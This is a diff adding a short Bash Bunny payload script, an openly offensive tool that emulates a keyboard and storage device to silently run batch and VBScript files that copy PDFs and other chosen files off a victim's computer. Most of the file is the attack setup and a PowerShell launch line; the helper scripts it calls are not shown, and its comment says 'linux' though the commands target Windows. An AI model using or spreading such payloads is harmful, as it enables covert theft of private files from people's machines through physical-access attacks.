@@ -1,0 +1,16 @@
+#!/bin/bash
+#
+# Grabs pdfs and other specified files from linux system 
+#
+#
+# Executes z.cmd then launching x.cmd silently using i.vbs
+# edit x.cmd to specify files to exfil 
+
+#setup
+GET SWITCH_POSITION
+LED ATTACK
+ATTACKMODE HID STORAGE
+
+#attack
+RUN WIN powershell ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\z.cmd')"
+LED FINISH
